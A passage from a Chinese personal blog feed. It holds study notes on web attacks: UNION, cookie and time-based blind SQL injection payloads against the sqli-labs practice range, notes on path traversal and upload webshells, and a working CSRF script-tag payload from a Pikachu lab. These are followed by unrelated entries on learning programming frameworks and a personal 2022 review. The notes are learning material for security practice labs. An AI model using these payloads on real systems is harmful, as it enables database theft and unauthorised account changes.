src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415174534.PNG"></p><p><strong>5）获取改数据下的所有表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">-- 'and password='password' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415180003.PNG"></p><p><strong>6）获取emails表的字段(id,email_id两个字段)</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'emails'</span> <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415181000.PNG"></p><p><strong>7）获取数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>email_id <span class="token punctuation">)</span><span class="token keyword">from</span> emails<span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415181413.PNG"></p></blockquote><p><strong>Request接受</strong></p><p><strong>通过提交方式，绕过防护软件</strong></p><p><strong>php的SERVER[]全局变量，获取操作系统，用户IP，等</strong></p><h3 id="3-cookie注入"><a href="#3-cookie注入" class="headerlink" title="3.cookie注入"></a>3.cookie注入</h3><blockquote><p>♦<strong>cookie注入的原理是：就要修改cookie的值，</strong></p><p>　　♦cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。</p><p>　　♦相对post和get方式注入来说，cookie注入就要稍微繁琐一些了，要进行cookie注入，我们首先就要修改cookie，这里就需要使用到<a href="http://www.2cto.com/kf/ware/Java/">Java</a>script语言了。另外cookie注入的形</p><p>　　♦<strong>成有两个必须条件，</strong></p><p>　　　　<strong>条件1是：</strong>程序对get和post方式提交的数据进行了过滤，但未对cookie提交的<a href="http://www.2cto.com/database/">数据库</a>进行过滤。</p><p>　　　　<strong>条件2是：</strong>在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</p><p><em><strong>*2.为什么要cookie注入？*</strong></em></p><p>　　****♦****主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p><p><a href="https://www.cnblogs.com/insane-Mr-Li/p/9142681.html">cookie注入原理详解（一） - tooltime - 博客园 (cnblogs.com)</a>)</p></blockquote><p><strong>案例，sqlilabs 第20关</strong></p><p><strong>1.代码审查</strong></p><p><em>1）在源代码中，如果没有设置cookie的uname的值，就会对post提交的uname与passwd进行过滤检查</em></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142237.PNG"></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142310.PNG"></p><p><em>2）如果设置cookie的uname值，并且没有设置submit，则在cookie中进行sql查询</em></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142326.PNG"></p><p><em>3）如果设置cookie的uname值，且设置submit，则输出” Your Cookie is deleted”;</em></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142338.PNG"></p><p><strong>2.抓波修改cookie的值，并把submit删除，进行测试</strong></p><p><strong>1)输入一个用户名和密码，点击提交，进行抓包。</strong></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145857.PNG"></p><p><strong>2）没更改cookie时的数据包</strong></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416150440.PNG"></p><p><strong>3).删除submit与更改cookie值，判断字段数（为3）</strong></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145929.PNG"></p><p><strong>4).查询想要的字段</strong></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145952.PNG"></p><p><strong>结果，数据库的名称为security，</strong></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416150029.PNG"></p><p><strong>5）就可以根据现有的注入点进行，暴库了</strong></p><h3 id="4-json提交数据的注入"><a href="#4-json提交数据的注入" class="headerlink" title="4 json提交数据的注入"></a>4 json提交数据的注入</h3><p><strong>一、Json简介</strong><br>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application/json”。</p><p><strong>json语法</strong><br>数据在名称/值对中<br>数据由逗号分隔<br>大括号保存对象<br>中括号保存数组<br><strong>JSON 值</strong><br>JSON 值可以是：</p><p>数字（整数或浮点数）  {“age”:30 }<br>字符串（在双引号中）  {“uname”:”yang”}<br>逻辑值（true 或 false） {“flag”:true }<br>数组（在中括号中）{“sites”:[{“name”:”yang”},{“name”:”ming”}]}<br>对象（在大括号中）JSON 对象在大括号（{}）中书写：<br>null    { “runoob”:null }</p><h2 id="（四）SQL-server注入"><a href="#（四）SQL-server注入" class="headerlink" title="（四）SQL server注入"></a>（四）SQL server注入</h2><p><strong>1.利用错误消息提取信息</strong>,having</p><blockquote><p>SQL Server 数据库是一个非常优秀的数据库，它可以准确地定位错误信息，这对攻击者来说是一件十分 美好的事情，因为攻击者可以通过错误消息提取自己想要的数据。</p></blockquote><p><strong>having的特点</strong></p><blockquote><p>1.having子句是用来对分组之后的信息进行过滤，在使用having时通常都会先使用group by。</p><p>2.having子句出现的字段必须的是分组之后的组的整体信息，having子句不允许出现组内的详细信息</p><p>3.having和where的异同:</p><p>相同:<br>都是对数据过滤，只保留有效的数据；<br>where和having一样，  都不允许出现字段的别名；<br>只允许出现最原始的字段的名字。</p><p>不同:<br>where是对原始的记录过滤having是对分组之后的记录过滤；<br>where必须的写在having的前面，顺序不可颠倒否则运行出错。</p><p>4.利用having的报错可以爆出表名与字段名</p></blockquote><h2 id="（五）access数据库"><a href="#（五）access数据库" class="headerlink" title="（五）access数据库"></a>（五）access数据库</h2><h3 id="1-特点"><a href="#1-特点" class="headerlink" title="1.特点"></a>1.特点</h3><ul><li>access</li></ul><p>​                 表名</p><p>​                         列明</p><p>​                                 数据</p><ul><li>没有数据库，access就相当于数据库，其他数据库比access要高级</li><li>没有内置方法</li><li>在asp网站中，数据库保存在当前的文件目录下</li></ul><h3 id="2-注入"><a href="#2-注入" class="headerlink" title="2.注入"></a>2.注入</h3><ul><li>只能是猜数据表和字段的名称，通过字典来跑</li></ul><h2 id="（六）盲注（sql本身查询方式insert-update等，或者网站过滤）"><a href="#（六）盲注（sql本身查询方式insert-update等，或者网站过滤）" class="headerlink" title="（六）盲注（sql本身查询方式insert,update等，或者网站过滤）"></a>（六）盲注（sql本身查询方式insert,update等，或者网站过滤）</h2><h3 id="1-基于布尔的逻辑判断"><a href="#1-基于布尔的逻辑判断" class="headerlink" title="1.基于布尔的逻辑判断"></a>1.基于布尔的逻辑判断</h3><h3 id="2-基于时间的延时判断"><a href="#2-基于时间的延时判断" class="headerlink" title="2.基于时间的延时判断"></a>2.基于时间的延时判断</h3><p><strong>if,sleep。if(条件,A,B)条件成立返回A，不成立返回B</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> member <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#根据页面的加载时间判断数据库，不需要回显</span><span class="token comment">#缺点会受到网络速度的影响</span><span class="token comment">#判断段数据库的长度，爆破</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> member <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>mid抓取一个字符进行判断，就可以通过暴力破解数据库名mid(srt,a,b)从a位开始，抓取b个</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-基于报错的报错错回显"><a href="#3-基于报错的报错错回显" class="headerlink" title="3.基于报错的报错错回显"></a>3.基于报错的报错错回显</h3><h1 id="二-文件操作"><a href="#二-文件操作" class="headerlink" title="二.文件操作"></a>二.文件操作</h1><p><strong>1.跨目录文件的读取</strong></p><p><strong>2.如果读取到数据库配置文件，就会找到用户密码</strong></p><p><strong>3.通过工具扫目录，或者进行目录爬行，有时候读取的文件不会显示，可以通过修改源代码来达成目的</strong></p><p><strong>4.危害，发现目录盘的结构，配合一些操作</strong></p><h2 id="2-1网站文件"><a href="#2-1网站文件" class="headerlink" title="2.1网站文件"></a>2.1网站文件</h2><blockquote><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220411112042.jpeg"></p><p><a href="http://192.168.3.133:88/vul/dir/dir_list.php?title=truman.php">http://192.168.3.133:88/vul/dir/dir_list.php?title=truman.php</a></p><p>①网站域名<a href="http://192.168.3.133:88，文件夹vul/dir，文件dir_list.php，参数名itle，参数值">http://192.168.3.133:88，文件夹vul/dir，文件dir_list.php，参数名itle，参数值</a></p></blockquote><h2 id="2-2文件读取"><a href="#2-2文件读取" class="headerlink" title="2.2文件读取"></a>2.2文件读取</h2><p><strong>获取文件内容，但不可以获取目录结构</strong></p><p><strong>原因为程序员写代码时的不同</strong></p><h2 id="2-3文件上传（高危）"><a href="#2-3文件上传（高危）" class="headerlink" title="2.3文件上传（高危）"></a>2.3文件上传（高危）</h2><p><strong>1.上传文件到网站目录</strong></p><p><strong>2.危害webshell植入后门</strong></p><h2 id="2-4目录遍历"><a href="#2-4目录遍历" class="headerlink" title="2.4目录遍历"></a>2.4目录遍历</h2><h2 id="2-5文件下载"><a href="#2-5文件下载" class="headerlink" title="2.5文件下载"></a>2.5文件下载</h2><p><strong>存在文件下载的漏洞时，查看下载的地址，遍历出文件，通过..\的越级下载东西</strong></p><p><strong>出现在有下载的位置</strong></p><h1 id="三-注入拓展"><a href="#三-注入拓展" class="headerlink" title="三.注入拓展"></a>三.注入拓展</h1><h2 id="3-1-加密注入"><a href="#3-1-加密注入" class="headerlink" title="3.1 加密注入"></a>3.1 加密注入</h2><p>cookie的内容是被加密过的，注入的语句是需要进行相同的加密加密方式进行加密。</p><h2 id="3-2二次注入"><a href="#3-2二次注入" class="headerlink" title="3.2二次注入"></a>3.2二次注入</h2><p><strong>扫描工具一般是没有进行二次注入的，有源代码的测试比较可行。通过代码分析还是人工分析。</strong></p><blockquote><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p><strong>二次注入，可以概括为以下两步:</strong></p><ul><li>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li><li>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li></ul></blockquote><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220511231216.webp"></p><ul><li>当输入的参数在前端有长度限制可以在html里面更改，后台限制则不可更改。</li></ul><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><ul><li>明确漏洞的危害，目的与漏洞有关，漏洞提供什么样的帮助</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全攻防 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF实验</title>
      <link href="/posts/64967.html"/>
      <url>/posts/64967.html</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF实验"><a href="#CSRF实验" class="headerlink" title="CSRF实验"></a>CSRF实验</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><span style="background:#00BFFF">#d 什么是csrf</span></p><p>通过构造用户在某个网站<strong>相同的数据包结构</strong>，来模拟用户进行操作（修改信息，发送信息，添加管理员等）</p><p><span style="background:#00BFFF">#d csrf的危害</span></p><p>低威漏洞，因为漏洞利用有条件限制，①需要用户登录上我们想攻击的网站，②还要使用户点击我们构造的网站</p><h2 id="实验一：-pikachu靶场复现CSRF漏洞"><a href="#实验一：-pikachu靶场复现CSRF漏洞" class="headerlink" title="实验一： pikachu靶场复现CSRF漏洞"></a>实验一： pikachu靶场复现CSRF漏洞</h2><h3 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h3><ul><li>pikachu靶场</li><li>win2008:192.168.61.145</li><li>win7:192.168.61.145</li></ul><h3 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h3><ul><li>在win2008中进入pikachu的csrf，在进入信息修改的界面</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232735.png" style="zoom:50%;"><ul><li><p>点击submit，然后抓包查看头部信息</p><p>可见请求信息为</p><pre class="line-numbers language-txet" data-language="txet"><code class="language-txet">http://192.168.61.145:88/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=123567898&amp;add=nba+lakes&amp;email=nihao%40pikachu.com&amp;submit=submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232751.png" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232752.png" style="zoom:50%;"><ul><li>在win7(192.168.61.146)中设计一个含有同样请求（修改数据：手机号为11111111）的网站。</li></ul><p>test.html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://192.168.61.145:88/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=11111111&amp;add=nba+lakes&amp;email=nihao%40pikachu.com&amp;submit=submit<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>hello word<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>在win2008中模拟访问该网站实现跨站请求</p><p>通过检查发现，发现该网站发送了一个数据包，其结构与我们在pikachu修改时抓包一样，只是修改了手机号。</p></li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232753.png" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> 安全攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年编程框架的使用总结</title>
      <link href="/posts/4029.html"/>
      <url>/posts/4029.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-专业上的收获"><a href="#1-专业上的收获" class="headerlink" title="1.专业上的收获"></a>1.专业上的收获</h2><h3 id="1-1-框架的使用"><a href="#1-1-框架的使用" class="headerlink" title="1.1 框架的使用"></a>1.1 框架的使用</h3><p>该部分的结构如下，绿色是概括，灰色是过度解释等，蓝色是描述，橙色多数是描述对应的例子，黄色是迁移</p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20230103124345.png" alt="image-20230103124343725" style="zoom:67%;"><img src="E:/markdown%E6%96%87%E4%BB%B6/typroaPic/image-20230103124226826.png" alt="image-20230103124226826" style="zoom: 67%;"><h4 id="1-1-1-背景"><a href="#1-1-1-背景" class="headerlink" title="1.1.1 背景"></a>1.1.1 背景</h4><p>#c 过渡 目标</p><p>2022年使用使用框架做了许多的东西，如下所示；我在使用这些框架时，大多数是需要使用这个框架来完成一些课程作业。这一年使用了这五个框架来完成课程任务，下面从五个框架进行「归纳」，然后「预测」自己在使用下一个框架时，能够更快的上手一个框架。</p><blockquote><ul><li>使用Qt框架写了一个CS模式的算法可视化</li><li>使用Django框架写一个BS模式个人博客网站</li><li>使用微信小程序+django做了一个电子投票的系统</li><li>学习了vue框架的部分知识</li><li>使用hexo框架搭建了个人静态网站</li></ul></blockquote><p>#c 解释 输入输出</p><blockquote><p>这里选择的输入是「学习框架的方式」，对输入进行细分，我提取了「目录结构」，「基础编程语言」，「开发工具」，「常用组件」，「框架文档」，「算法」这六元素作为输入，输出是「框架所作出的项目」，渐构的模型是「从六元素出发可以帮助我们快速掌握一个框架」</p></blockquote><h4 id="1-1-2-认识框架"><a href="#1-1-2-认识框架" class="headerlink" title="1.1.2 认识框架"></a>1.1.2 认识框架</h4><p>#d 框架</p><blockquote><p>框架是一组基础代码，它为应用程序或网站的开发提供了一组结构和标准。框架通常包含一些基本的功能和组件，并为开发者提供了一组编程接口，使开发者能够在框架的基础上开发应用程序或网站。</p><p>框架的目的是为开发者提供一组统一的架构和编程模型，使他们能够更快地开发应用程序或网站，并使这些应用程序或网站更具可维护性和扩展性。</p></blockquote><p>#t 修建房子 框架</p><blockquote><p>现在我们在看建筑工人修建房子的时候，其中修建房子所需要的「材料」，如门，窗户，砂浆，砖瓦等都是已经准备好了，这些材料就好比框架提供的「一组结构和标准」。我门在修建房子时不用再去拉沙子，水泥，然后自己弄泥浆；也不用再自己去山上砍树，自己切木头来做门了直接使用已经提供好的。</p></blockquote><p>#e 微信小程序 框架<br>微信小程序提供了一组组件和 API，让开发者可以使用这些组件和 API 开发小程序应用，比如：界面布局、数据存储、网络请求、地图、视频、音频等。所以微信程序是一个框架。</p><h4 id="1-1-3-掌握框架"><a href="#1-1-3-掌握框架" class="headerlink" title="1.1.3 掌握框架"></a>1.1.3 掌握框架</h4><p>#c 发现 框架的特点<br>这里再经过几个框架的使用，我发现框架有一下共同特点，「目录结构」，「常用组件」，「基础编程语言」，「高级组件」，「开发工具」，「文档」等。我们想快速使用一个框架来开发一个demo，可以从一下几点考虑。</p><p>#c 提问 快速掌握<br>那么，我们如何快速掌握框架呢？</p><p>#d 掌握基础编程语言</p><blockquote><p>框架是使用对应的「基础编程语言」，来对功能进行封装的。只有再掌握「基础编程语言」过后，才能更好的学习框架。<br>有时框架提供的组件不满足我们的需求时，就需要修改组件的源代码，如果不熟悉框架所使用的语言的话，就会导致学习困难。框架的文档有时也有代码，不熟悉框架使用的语言的话，也会导致阅读文档的困难。</p></blockquote><p>#e django框架<br>比如Django这个Web框架，的基础编程语言是python，Django在进行「数据库查询过滤」的时候就需要使用python的「字典」和「列表」，如果不清楚字典和列表的话，就会导致学习困难，失去信心。</p><p>#e 微信小程序框架<br>微信小程序的开发语言是 JavaScript，所以开发者在使用微信小程序框架时，需要掌握 JavaScript 的基础知识。同时还要了解HTML文本标记，CSS样式，注意HTML与CSS不是「编程语言」。</p><p>#d 熟悉开发工具与目录结构</p><blockquote><p>有可框架有自己特有的开发工具，比如了解开发工具如何创建一个项目，设置功能等等。主要的是明白框架的目录结构，比如每个文件夹有什么作用，那些是主要的文件，我们创建的文件因该放在那个位置。</p></blockquote><p>#e 微信小程序目录结构<br><img src="http://www.mpgcw.com/wp-content/uploads/2021/02/2021021201.jpg"></p><blockquote><p>pages：这里存放小程序的页面文件。每个页面文件包含 HTML、CSS 和 JavaScript 三个部分，用于描述页面的结构、样式和交互功能。</p><p>components：这里存放小程序的组件文件。组件是可复用的页面元素，可以在多个页面中使用。每个组件文件也包含 HTML、CSS 和 JavaScript 三个部分，用于描述组件的结构、样式和交互功能。</p><p>utils：这里存放小程序的工具文件。工具文件通常是一些 JavaScript 文件，包含一些常用的函数和方法，可以在多个页面或组件中使用。</p><p>images：这里存放小程序的图片文件。</p><p>app.js：这是小程序的入口文件，包含小程序的初始化代码。</p><p>app.json：这是小程序的配置文件，包含小程序的名称、版本、页面路径等信息。</p><p>app.wxss：这是小程序的全局样式文件，包含小程序的全局样式规则。</p><p>比较重要的文件，如pages，app.js，app.json需要掌握。</p></blockquote><p>#d 掌握常用组件</p><blockquote><p>如果我们想使用一个框架来完成老师布置的课程设计，我们需要把一个框架学完才开始吗？这显然是不行的，一是时间上不允许，二是在学习时持久做不出来项目，会逐渐失去信心。所以我认为在「掌握常用组件」后，就可以开始写老师的课程设计了，因为小demo或者项目的反馈，有助于提高学习的兴趣。每个框架都有其特色并且经常使用的功能，我们在知道自己需要使用的常用功能后，可以寻找对应的资料来学习，B站视频，官方文档等都可以，这样就可以按需学习了。当我们逐渐的对这个框架熟悉过后，可以根据自己的需要选择学习「高级组件」或者系统的学习整个框架。</p></blockquote><p>#e Qt常用功能</p><blockquote><p>布局管理器：Qt 提供了多种布局管理器，可以让你轻松地调整窗口内部各个部件的位置和大小。<br>信号和槽：Qt 提供了信号和槽机制，可以让你在不同的部件之间传递消息。<br>窗口部件：Qt 提供了多种窗口部件，包括按钮、菜单、文本框、列表框等，你可以使用这些部件来构建应用程序的用户界面。<br>事件处理：Qt 支持事件处理机制，你可以使用事件处理函数来响应用户的操作。<br>图形绘制：Qt 提供了图形绘制功能，你可以使用它来绘制线条、曲线、图形等</p></blockquote><p>#d 训练文档的阅读</p><blockquote><p>当我们确定需要掌握的知识，就开始选择相应的资料进行学习了。「选择方式」比较多，如视频，文档，周围的同学等方式，这一年我是在B站上跟着视频进行学习的。但是我发现视频学习的一个问题，在学习过一个知识点过后，时间长，忘记了，需要找来回顾时，找特定的视频位置比较困难。这时通过文档就能很快的找到，但需要我们「训练文档的阅读能力」，以便自己能够在文档中获取自己需要的信息。</p></blockquote><p>#d 算法的训练</p><blockquote><p>之前在训练算法的时候，我在想我花时间解这道算法题，有什么作用呢？推动我学算法的动力在哪里呢？有时因为花时间，最后解出一道算法题的一种成就感。但也因为长时间没有解答出来，而逐渐失去信心。还不如做出一个小项目后的成就感强呢。</p><p>但是在今年先项目的过程中，我发现算法的重要性，在训练算法时，不应该用「是否解出算法题来反馈」，这样会导致长时间未解答出来而失去信心，应该用这个算法题「是否训练了自己的编程思维」来作为反馈。</p><p>「训练编写算法的能力」特点之一就是帮助我们训练「编程时的思维能力」，当我们在做项目的过程中，想到某个功能需求时，可以快速的实现。</p></blockquote><p>#e 嵌套for循环<br>我今年在写个人博客系统时，用户的Django框架，在后端处理数据时需要使用嵌套for循环来处理数据，但是这个嵌套for循环的判断却然我思考了好长一段时间。</p>]]></content>
      
      
      <categories>
          
          <category> 计划和总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年度总结 </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年终总结与2023年度计划</title>
      <link href="/posts/56901.html"/>
      <url>/posts/56901.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>2022年最后一个月，经历的事情比较独特，最后7天结束了四年半的异地恋。在失恋期间，做事情都不能集中精力，索性就在最后几天摆烂了，直接耍疯了。</p><p>总结是对过去的反思，未来的计划，当下的执行，过去的反思都是为了我的目标，我的目标体现了我想过怎样的生活，所以不要把事情做对，而是要做对的事情。</p><p>当暴风雨过去后，生活总会归于平静，农民还是一样会去地里种田除草，而我也会开始新的生活。因为其他情况2022的总结拖到了2023年才开始写，我大概做了一个思维导图，我也依照着上面的来对2022进行反思。</p><h2 id="2-年度计划完成情况"><a href="#2-年度计划完成情况" class="headerlink" title="2.年度计划完成情况"></a>2.年度计划完成情况</h2><p>年出在滴答九宫格制订的目标，从八个方面来平衡生活。</p><p>完成情况：</p><p><strong>学习成长：</strong></p><ul><li>12个视频完成了1个，100张调色1张也没有完成</li><li>10本专业书读了4本，15本课外书读了11本</li></ul><p><strong>体验突破：</strong></p><ul><li>学习文章发布50篇，发布了48篇</li></ul><p><strong>休闲放松：</strong></p><ul><li>与对象相关，但是已经分手</li></ul><p><strong>家庭生活：</strong></p><ul><li>一样也没有做</li></ul><p><strong>工作事业：</strong></p><ul><li>蓝桥杯训练的算法题只训练了40多道，省三都没有拿着</li></ul><p><strong>人际交流：</strong></p><ul><li>就找纪老师聊天，其他的都没有了</li></ul><p><strong>财务理财：</strong></p><ul><li>5本理财的书籍，看了2本</li><li>财务报告12篇完成了3篇</li></ul><p><strong>健康身体：</strong></p><ul><li>卷，杠没记录</li><li>跑步：100公里为达到目标</li></ul><blockquote><p>总的来讲，年度计划在做的时候比较全，但是做到能做到的没有想象中的那么多</p></blockquote><img src="E:/markdown%E6%96%87%E4%BB%B6/typroaPic/QQ%E5%9B%BE%E7%89%8720230102132607.png" alt="QQ图片20230102132607" style="zoom: 45%;"><h3 id="关键三要素"><a href="#关键三要素" class="headerlink" title="关键三要素"></a>关键三要素</h3><p><strong>描述：</strong>要想完「成年度计划」，需要「闭环」，「闭环」是指在完成年度计划的过程中需要有「计划」，「执行」，「复盘」的过程，「这三要素会影响年度计划的完成」。其中三个要素如果都参与了，能帮助完成年度计划，如果这三个要素没有充分参与到，会阻碍完成年度计划。计划是未来，可以帮助我们决定当下需要做什么；执行是当下，帮助我们完成目标；复盘是过去也是反馈，调整未来的计划与当下的执行。</p><p><strong>解释：</strong>这里的输入是「个人所有行为」，输出是「是否完成年度目标」，归纳出的模型是「年度计划的完成与三要素有关」</p><p><strong>补充：</strong>「计划」，「执行」，「复盘」这三个概念就不展开讲，也就是怎么做计划，执行，与复盘。具体可以参考书籍《只管去做》–皱小强</p><blockquote><p><strong>例子1：</strong>发表50篇技术文章到博客网站上，实际情况发表了48篇，未完成年度目标。在制订这个「计划」时，我有衡量计划的可执行性，量化等方面。在「执行」这个计划时，把学校的课程作业，尽量站在读者的角度，整理好文章发表在网站上。网站的统计数据，文章的阅读量，收藏数等「反馈」，促使我，也提醒我要发布能够获取更多阅读量的文章。在这个计划当中，「三要素」相互调整使得我距离目标比较接近。</p></blockquote><blockquote><p><strong>例子2：</strong>6月11号过英语四级，实际情况，完成目标。「计划」时是决定考前一个月开始学习的，单词坚持每天学。在「执行」时，单词能够保证一周至少有五天，每天都学习30个新单词，复习旧单词，在考试前把四级单词过了一遍，但具体题型练习是在考试前十天才准备的。是因为「周围同学的准备」提醒自己赶快准备。在这个计划当中「